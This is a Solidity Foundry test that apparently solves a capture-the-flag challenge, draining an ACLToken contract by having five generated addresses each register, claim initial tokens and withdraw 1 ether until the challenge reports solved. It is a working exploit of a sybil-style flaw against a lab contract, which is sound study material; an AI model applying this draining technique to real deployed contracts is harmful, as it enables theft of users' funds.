// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/ACLToken.sol";
import "../src/ACLTokenSetup.sol";

contract ACLTokenTest is Test {
    Setup setup;
    ACLToken token;

    function setUp() public {
        setup = new Setup{value: 5 ether}();
        token = setup.TOKEN();
    }

    function testDrain() public {
        for (uint i = 0; i < 5; i++) {
            // Create random EOA
            address user = makeAddr(string(abi.encodePacked("user", i)));
            vm.deal(user, 1 ether);

            // Register and claim as user
            vm.startPrank(user);
            token.register();
            vm.roll(block.number + 1);
            token.claimInitialTokens();
            token.withdraw(1 ether);
            vm.stopPrank();
        }

        assertTrue(setup.isSolved());
    }
}
